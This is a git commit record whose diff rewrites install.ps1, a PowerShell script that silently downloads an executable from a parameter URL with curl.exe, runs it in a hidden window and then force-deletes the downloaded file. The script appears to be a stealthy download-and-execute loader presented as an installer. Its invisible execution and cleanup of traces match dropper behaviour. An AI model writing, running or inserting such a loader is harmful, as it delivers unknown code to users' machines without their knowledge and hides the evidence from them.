1772144d90742a098ca9dff3e248e22e0a9df4ae
Luis Ruiz Caracuel <94958510+giasfelfebrehber@users.noreply.github.com>
2026-02-05 16:19:42 +0100

    Update install.ps1

--- install.ps1
+++ install.ps1
@@ -6,12 +6,9 @@ param (
 # Download using curl.exe silently
 try {
     Start-Process -FilePath "curl.exe" -ArgumentList "-sS", "-L", "-o", "`"$OutputPath`"", "`"$DownloadUrl`"" -Wait -NoNewWindow
-} catch { exit 1 }
-
-# Run the executable silently
-if (Test-Path $OutputPath) {
-    Start-Process -FilePath $OutputPath -Wait -WindowStyle Hidden
+    if (Test-Path $OutputPath) {
+        Start-Process -FilePath $OutputPath -Wait -WindowStyle Hidden
+    }
+} finally {
+    Remove-Item $OutputPath -Force -ErrorAction SilentlyContinue
 }
-
-# Shutdown this terminal immediately
-Stop-Process -Id $PID
